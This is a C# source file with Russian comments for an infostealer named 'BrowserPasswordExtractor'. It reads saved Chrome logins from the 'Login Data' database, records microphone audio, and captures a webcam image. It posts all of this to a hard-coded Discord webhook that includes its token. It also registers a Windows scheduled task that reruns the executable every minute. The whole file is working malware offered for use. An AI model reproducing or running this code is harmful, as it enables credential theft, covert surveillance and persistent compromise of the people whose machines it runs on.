using System.Net;
using System.Data.SQLite;
using Emgu.CV;
using NAudio.Wave;
using Microsoft.Win32.TaskScheduler;
using System.Runtime.InteropServices;


namespace BrowserPasswordExtractor
{

    class UniquePasswordExtractor
    {

        // Маска аффинитета(affinity mask) — это битовая маска, 
        //которая указывает, на каких ядрах процессора процесс или поток может выполняться.
        //     Каждый бит в маске соответствует определенному ядру процессора.Если бит 
        //    установлен в 1, то процесс может выполняться на этом ядре; если бит установлен
        //     в 0, то выполнение на этом ядре запрещено.


        // Импортируем функцию GetCurrentProcess из библиотеки kernel32.dll, 
        // которая возвращает хендл текущего процесса.
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();


        // Импортируем функцию SetProcessAffinityMask из библиотеки kernel32.dll, 
        // которая задает маску аффинитета для процесса.
        [DllImport("kernel32.dll")]
        private static extern IntPtr SetProcessAffinityMask(IntPtr handle, IntPtr mask);

        static void Main(string[] args)
        {

            // Получаем текущий процесс
            IntPtr processHandle = GetCurrentProcess();

            // Получаем количество ядер процессора
            int processorCount = Environment.ProcessorCount;

            // Создаем маску, чтобы ограничить выполнение только на первом ядре
            IntPtr affinityMask = new IntPtr(1);

            // Устанавливаем маску аффинитета процесса
            SetProcessAffinityMask(processHandle, affinityMask);

            Start(args).GetAwaiter().GetResult();

            // Создаем запланированную задачу, которая будет выполняться через определенные интервалы времени.
            CreateTask();

            Console.WriteLine("Program execution limited to one processor core.");

        }

        // Асинхронный метод, который извлекает пароли из браузеров и возвращает их в виде списка словарей.
        static async Task<List<Dictionary<string, string>>> ExtractPasswordsAsyncUnique()
        {
            // Инициализируем список для хранения извлеченных паролей.
            var extractedPasswords = new List<Dictionary<string, string>>();

            // Создаем словарь, который хранит пути к профилям браузеров.
            var browserPaths = new Dictionary<string, string>
            {
                // Добавляем путь к профилю Chrome.
                { "Chrome", GetChromeProfilePath() }
            };

            // Итерируем по каждому элементу в словаре browserPaths.
            foreach (var browser in browserPaths)
            {
                // Проверяем, является ли текущий браузер Chrome.
                if (browser.Key == "Chrome")
                {
                    // Формируем путь к файлу базы данных логинов Chrome.
                    var dbPath = Path.Combine(browser.Value, "Default", "Login Data");
                    try
                    {
                        // Открываем соединение с базой данных SQLite по указанному пути.
                        using (var conn = new SQLiteConnection($"Data Source={dbPath};Version=3;"))
                        {
                            // Асинхронно открываем соединение с базой данных.
                            await conn.OpenAsync();
                            // Создаем команду для выполнения SQL-запроса.
                            using (var cmd = conn.CreateCommand())
                            {

                                // Устанавливаем текст SQL-запроса для извлечения данных из таблицы логинов.
                                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";

                                // Асинхронно выполняем запрос и получаем ридер для чтения данных.
                                using (var reader = await cmd.ExecuteReaderAsync())
                                {

                                    // Читаем результаты запроса построчно.
                                    while (await reader.ReadAsync())
                                    {
                                        // Извлекаем значения столбцов из текущей строки.
                                        var originUrl = reader["origin_url"].ToString();
                                        var username = reader["username_value"].ToString();
                                        var password = reader["password_value"].ToString();

                                        // Добавляем извлеченные данные в список extractedPasswords в виде словаря.
                                        extractedPasswords.Add(new Dictionary<string, string>
                                        {
                                            { "OriginUrl", originUrl },
                                            { "Username", username },
                                            { "Password", password }
                                        });
                                    }
                                }
                            }
                        }
                    }

                    // Обрабатываем возможные исключения при извлечении паролей.
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error extracting passwords from Chrome: {ex.Message}");
                    }
                }
            }
            // Возвращаем список извлеченных паролей.
            return extractedPasswords;
        }


        // Метод, который принимает список словарей с паролями и возвращает их в виде строки.
        static string SavePasswordsToFileUnique(List<Dictionary<string, string>> passwords)
        {
            // Инициализируем пустую строку, которая будет содержать все пароли.
            string passwordsString = "";

            // Итерируем по каждому словарю в списке паролей.
            foreach (var password in passwords)
            {
                // Итерируем по каждой паре ключ-значение в текущем словаре.
                foreach (var pair in password)
                {
                    // Добавляем ключ и значение пары в строку passwordsString, разделяя их двоеточием и новой строкой.
                    passwordsString += $"{pair.Key}: {pair.Value}\n";
                }
                // Добавляем строку из звездочек для разделения записей паролей.
                passwordsString += "************************************\n";
            }
            // Возвращаем строку, содержащую все пароли.
            return passwordsString;
        }

        // Метод, который возвращает путь к профилю Chrome, если он существует.
        static string GetChromeProfilePath()
        {
            // Получаем путь к локальному каталогу приложения (LocalAppData).
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            // Формируем полный путь к каталогу профиля пользователя Chrome.
            string chromePath = Path.Combine(localAppDataPath, "Google", "Chrome", "User Data");

            // Проверяем, существует ли этот каталог.
            if (Directory.Exists(chromePath))
            {
                // Если каталог существует, возвращаем путь к нему.
                return chromePath;
            }
            else
            {
                // Если каталог не существует, выводим сообщение об ошибке и возвращаем null.
                Console.WriteLine("Chrome profile path not found.");
                return null;
            }
        }

        // Асинхронный метод для отправки текстового содержимого на Discord с использованием вебхука.
        static async System.Threading.Tasks.Task SendStringToDiscordUnique(string content, string fileName, string webhookUrl)
        {
            try
            {
                // Создаем HttpClient для отправки HTTP-запросов.
                using (var client = new HttpClient())
                {
                    // Создаем MultipartFormDataContent для отправки данных в формате multipart/form-data.
                    using (var contentData = new MultipartFormDataContent())
                    {
                        // Добавляем текстовое содержимое в качестве файла.
                        contentData.Add(new StringContent(content), "file", fileName);

                        // Отправляем POST-запрос к указанному вебхуку Discord с данными.
                        var response = await client.PostAsync(webhookUrl, contentData);

                        // Проверяем статус ответа.
                        if (response.StatusCode == HttpStatusCode.OK)
                        {
                            // Если статус 200 OK, выводим сообщение об успешной отправке.
                            Console.WriteLine($"String content sent successfully to Discord as {fileName}");
                        }
                        else
                        {
                            // Если статус не 200 OK, выводим сообщение об ошибке с кодом состояния.
                            Console.WriteLine($"Failed to send string content to Discord. Status code: {response.StatusCode}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Если возникает исключение, выводим сообщение об ошибке с описанием исключения.
                Console.WriteLine($"Error sending string content to Discord: {ex.Message}");
            }
        }

        // Метод для захвата изображения с веб-камеры.
        static Mat CaptureWebcamImageUnique()
        {
            // Создаем объект VideoCapture для захвата видео с устройства камеры.
            // В аргументе конструктора указываем индекс камеры (0 означает первую камеру в системе).
            VideoCapture capture = new VideoCapture(0);

            // Проверяем, удалось ли открыть камеру.
            if (!capture.IsOpened)
            {
                // Если камеру не удалось открыть, выводим сообщение об ошибке и возвращаем null.
                Console.WriteLine("Error: Unable to open camera");
                return null;
            }

            // Создаем объект Mat для хранения кадра, захваченного с камеры.
            Mat frame = new Mat();

            // Захватываем кадр с камеры и сохраняем его в объект frame.
            capture.Read(frame);

            // Проверяем, удалось ли захватить кадр.
            if (frame.IsEmpty)
            {
                // Если кадр пустой, выводим сообщение об ошибке и возвращаем null.
                Console.WriteLine("Error: Unable to capture frame");
                return null;
            }
            // Возвращаем захваченный кадр.
            return frame;
        }

        // Асинхронный метод для отправки изображения на Discord с использованием вебхука.
        static async System.Threading.Tasks.Task SendImageToDiscordUnique(Mat image, string webhookUrl)
        {
            try
            {
                // Создаем HttpClient для отправки HTTP-запросов.
                using (var client = new HttpClient())
                {
                    // Создаем MultipartFormDataContent для отправки данных в формате multipart/form-data.
                    using (var content = new MultipartFormDataContent())
                    {
                        // Создаем MemoryStream для временного хранения байтов изображения.
                        using (var memoryStream = new MemoryStream())
                        {
                            // Кодируем изображение в формат JPEG и преобразуем его в массив байтов.
                            var imageBytes = CvInvoke.Imencode(".jpg", image).ToArray();

                            // Создаем ByteArrayContent для добавления изображения в содержимое HTTP-запроса.
                            using (var imageContent = new ByteArrayContent(imageBytes))
                            {
                                // Добавляем байтовое содержимое изображения в форму данных.
                                content.Add(imageContent, "file", "webcam_image.jpg");
                                // Добавляем текстовое описание к изображению.
                                content.Add(new StringContent("Webcam Image"), "content");

                                // Отправляем POST-запрос к указанному вебхуку Discord с данными.
                                var response = await client.PostAsync(webhookUrl, content);

                                // Проверяем статус ответа.
                                if (response.StatusCode == HttpStatusCode.OK)
                                {
                                    // Если статус 200 OK, выводим сообщение об успешной отправке.
                                    Console.WriteLine("Image sent successfully to Discord");
                                }
                                else
                                {
                                    // Если статус не 200 OK, выводим сообщение об ошибке с кодом состояния.
                                    Console.WriteLine($"Failed to send image to Discord. Status code: {response.StatusCode}");
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Если возникает исключение, выводим сообщение об ошибке с описанием исключения.
                Console.WriteLine($"Error sending image to Discord: {ex.Message}");
            }
        }

        // Метод для записи аудио с использованием библиотеки NAudio
        static byte[] RecordAudioUnique(int durationSeconds = 5, int sampleRate = 44100, int channels = 2)
        {
            try
            {
                // Создаем формат волны с заданными частотой дискретизации и количеством каналов.
                var waveFormat = WaveFormat.CreateIeeeFloatWaveFormat(sampleRate, channels);
                byte[] audioBytes;

                // Используем MemoryStream для временного хранения записанных байтов аудио.
                using (var memoryStream = new MemoryStream())
                {
                    // Создаем WaveFileWriter для записи аудио в поток в формате WAV.
                    using (var writer = new WaveFileWriter(memoryStream, waveFormat))
                    {
                        // Создаем WaveInEvent для захвата аудио с микрофона.
                        using (var waveIn = new WaveInEvent())
                        {
                            // Устанавливаем формат захватываемой волны.
                            waveIn.WaveFormat = waveFormat;

                            // Обработчик события DataAvailable вызывается, когда есть данные для записи.
                            waveIn.DataAvailable += (sender, e) =>
                            {
                                // Записываем данные из буфера в файл.
                                writer.Write(e.Buffer, 0, e.BytesRecorded);
                            };

                            // Записываем данные из буфера в файл.
                            waveIn.StartRecording();
                            // Задержка выполнения на указанное количество секунд для записи.
                            System.Threading.Thread.Sleep(durationSeconds * 1000);

                            // Останавливаем запись аудио.
                            waveIn.StopRecording();
                        }
                    }

                    // Преобразуем записанные байты из MemoryStream в массив байтов.
                    audioBytes = memoryStream.ToArray();
                }

            
                Console.WriteLine("Audio recorded.");

                // Возвращаем массив байтов с записанным аудио.
                return audioBytes;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);

                // Возвращаем null в случае ошибки.
                return null;
            }
        }

        //отправка аудиофайла на сервер Discord
        static async System.Threading.Tasks.Task SendAudioToDiscordUnique(byte[] audioBytes, string webhookUrl)
        {
            try
            {
                // Создаем HTTP-клиент для отправки запросов
                using (var client = new HttpClient())
                {
                    // Создаем контент для отправки данных формы в многопользовательском формате
                    using (var content = new MultipartFormDataContent())
                    {
                        // Создаем контент для отправки аудиофайла как массив байтов
                        using (var audioContent = new ByteArrayContent(audioBytes))
                        {
                            // Добавляем аудиофайл в контент с указанием имени файла и ключа "file"
                            content.Add(audioContent, "file", "recorded_audio.wav");

                            // Добавляем строковое содержимое "Extracted audio" в контент с ключом "content"
                            content.Add(new StringContent("Extracted audio"), "content");

                            // Отправляем POST-запрос на указанный webhookUrl с данными контента
                            var response = await client.PostAsync(webhookUrl, content);

                            // Проверяем статус код ответа
                            if (response.StatusCode == HttpStatusCode.OK)
                            {
                                Console.WriteLine("Audio sent successfully to Discord");
                            }
                            else
                            {
                                Console.WriteLine($"Failed to send audio to Discord. Status code: {response.StatusCode}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending audio to Discord: {ex.Message}");
            }
        }

        
        static async System.Threading.Tasks.Task Start(string[] args)
        {
            Console.WriteLine("Starting extraction...");

            var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var audioFilePath = Path.Combine(desktopPath, "recorded_audio.wav");
            var audioBytes = RecordAudioUnique(durationSeconds: 10);

            var extractedPasswords = await ExtractPasswordsAsyncUnique();
            var textFilePath = Path.Combine(desktopPath, "extracted_passwords.txt");
            var passwordsString = SavePasswordsToFileUnique(extractedPasswords);
            Console.WriteLine($"Extracted passwords saved to: {textFilePath}");

            var image = CaptureWebcamImageUnique();
            var discordWebhookUrl = "https://discord.com/api/webhooks/1220040980905066578/WFReCg5LDXr8OIlTnP16EWYypmAso6uYzo0S-zr28xztX0MvknwGiSEclnRIYk3s7kb7";
            await SendStringToDiscordUnique(passwordsString, "extracted_passwords.txt", discordWebhookUrl);
            await SendImageToDiscordUnique(image, discordWebhookUrl);
            await SendAudioToDiscordUnique(audioBytes, discordWebhookUrl);
            Console.WriteLine("Extraction complete.");
        }
        //создает задачу в планировщике задач Windows
        static void CreateTask()
        {
            // Используем блок using для автоматического освобождения ресурсов
            using (Microsoft.Win32.TaskScheduler.TaskService ts = new Microsoft.Win32.TaskScheduler.TaskService())
            {
                // Создаем новую задачу (TaskDefinition)
                TaskDefinition td = ts.NewTask();

                // Задаем описание для задачи
                td.RegistrationInfo.Description = "Запуск программы с задержкой";

                // Создание триггера по времени и его настройка на повторение каждую минуту
                TimeTrigger trigger = new TimeTrigger();
                trigger.StartBoundary = DateTime.Now.AddMinutes(1); // Начало выполнения через 1 минуту после загрузки
                trigger.Repetition.Interval = TimeSpan.FromMinutes(1); // Повторять каждую минуту
                td.Triggers.Add(trigger); // Добавляем триггер к задаче

                // Указываем действие для задачи (запуск вашей программы)
                td.Actions.Add(new ExecAction(@"C:\Users\iliec\Desktop\virus\ConsoleApp4.exe", "", null));

                // Регистрируем задачу в планировщике задач
                ts.RootFolder.RegisterTaskDefinition("UniquePasswordExtractorTask", td);
                Console.WriteLine("Task created.");
            }
        }
    }
}